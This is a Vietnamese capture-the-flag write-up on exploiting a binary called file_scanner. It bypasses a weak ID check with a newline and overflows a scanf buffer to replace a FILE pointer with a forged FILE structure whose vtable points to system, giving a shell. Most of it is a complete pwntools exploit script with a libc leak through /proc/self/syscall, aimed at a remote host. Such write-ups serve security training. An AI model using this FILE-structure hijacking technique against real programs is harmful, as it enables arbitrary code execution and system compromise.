Mở chương trình ta thấy ý đồ của tác giả là muốn ta sử dụng kỹ thuật tấn công FILE_STRUCTURE
Kỹ thuật này đã được phân tich nhiều trên mạng https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

```C
  v3 = time(0);
  srand(v3);
  for ( i = 0; i <= 15; ++i )
    randomByteID[i] = generateRandomHexValue();
  memset(ID, 0, sizeof(ID));
  printf("Are you Huster? Show me your ID: ");
  custom_read(ID);
  n = strlen(ID);
  if ( strncmp(ID, randomByteID, n) )
  {
    printf("Do you forgot your ID, so badd !!!");
    exit(1);
  }
```
Ta thấy đoạn này chương trình sẽ đọc 16 byte random vô `randomByteID` sau đó cho ta nhập vô `ID` và đem hai cái này so sánh với nhau. Nhưng nó sẽ chỉ so sánh tương ứng với số byte ta nhập vô `ID`.
Vậy ta chỉ cần nhập "\n" để pass qua đoạn này.


```C
 if ( v4 == 4 )
  {
    puts("oh... I forgot asking your name");
    printf("What is your name: ");
    __isoc99_scanf("%s", name);
    printf("See you soon, %s !!!\n", name);
    if ( filePtr )
      fclose(filePtr);
    exit(1);
```
Ta có thể tháy ở option4 ta có lỗi overflow , xem địa chỉ vùng bss ta có thể thấy name sẽ nằm phía trên filePtr và fileContent:

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/7f65e455-c1e1-4d82-a16f-b2147bf2fa3f)


Vậy ta sẽ overwrite địa chỉ của `filePtr` trỏ đến địa chỉ của một fake FILE_STRUCTURE ta đã chuẩn bị trước đó tại `fileContent`:
Như trong slide mình để link đã phân tích thì khi chương trình gọi một hàm thì chương trình sẽ gọi một function trong bảng `vtable` tương ứng của nó để thực hiện .
Vậy nếu ta có thể làm giả một vtable chứa toàn địa chỉ của system, mà ta thấy khi chưng trình gọi hàm `fclose(filePtr)` thì `filePtr` được truyền vô như là argument duy nhất , vậy nếu ta sửa `filePtr->flag` thành `/bin/sh` thì ta sẽ có shell.
Cấu trúc của một FILE_STRUCTURE như sau :
```C
{ flags: 0x0
 _IO_read_ptr: 0x0
 _IO_read_end: 0x0
 _IO_read_base: 0x0
 _IO_write_base: 0x0
 _IO_write_ptr: 0x0
 _IO_write_end: 0x0
 _IO_buf_base: 0x0
 _IO_buf_end: 0x0
 _IO_save_base: 0x0
 _IO_backup_base: 0x0
 _IO_save_end: 0x0
 markers: 0x0
 chain: 0x0
 fileno: 0x0
 _flags2: 0x0
 _old_offset: 0xffffffff
 _cur_column: 0x0
 _vtable_offset: 0x0
 _shortbuf: 0x0
 unknown1: 0x0
 _lock: 0x0
 _offset: 0xffffffffffffffff
 _codecvt: 0x0
 _wide_data: 0x0
 unknown2: 0x0
 vtable: 0x0}
```
một lưu ý là phần `filePtr->_lock` ta cần nó trỏ đến địa chỉ nào đó NULL , để tránh xảy ra lỗi:

![image](https://github.com/DoQuangPhu/CTF_writeups/assets/93699926/e7de8c85-8214-4e33-ada9-c50905b15d74)

Để có thể có địa chỉ của system thì chúng ta chỉ cần mở một file nào đó chứa thông tin về tiến trình chúng ta đang chạy đê có thể leak libc.
Có thể chọn `/proc/self/maps` hoặc `/proc/self/syscall`

Pwntool đã cung cấp cho chúng ta sẵn `FileStruture` frameWork, ta sẽ sử dụng nó để thuận tiện cho việc exploit của chúng ta:
```python
#!/usr/bin/env python3

from pwn import *
import random
import time
from ctypes import *

context.binary = exe = ELF("./file_scanner_patched",checksec=False)
libc = ELF("./libc_32.so.6",checksec=False)
ld = ELF("./ld-2.23.so",checksec=False)

def GDB():
    gdb.attach(p,gdbscript='''
    b*0x08048CC9
    c
    ''')
    input()
if args.REMOTE:
    p = remote("52.221.218.121", 30565)
else:
    p = process([exe.path])
    GDB()

p.sendafter(b"Are you Huster? Show me your ID: ",b"\n")
def open(name):
    p.sendlineafter(b"Your choice :",b"1")
    p.sendlineafter(b"Enter the filename: ",name)
def read():
    p.sendlineafter(b"Your choice :",b"2")
def show():
    p.sendlineafter(b"Your choice :",b"3")

open(b"/proc/self/syscall")
read()
show()
leak = int(str(p.recvline()[:-1])[66:66+10],16)

print(hex(leak))
libc.address = leak - 0x1ba569
log.info('[+]LIBC BASE:'+hex(libc.address))


file = FileStructure()
file.flags=b'/bin'
file._IO_read_ptr=b"/sh\x00"
file._lock=p32(0x804b2f8)
file.vtable=p32(0x804b178)
payload = b"A"*0x20+p32(exe.sym['fileContent']) + b"A"*(0x20 -4)+bytes(file)+p32(libc.sym['system'])*20
p.sendlineafter(b"Your choice :",b"4")
p.sendlineafter(b"What is your name: ",payload)

p.interactive()

```



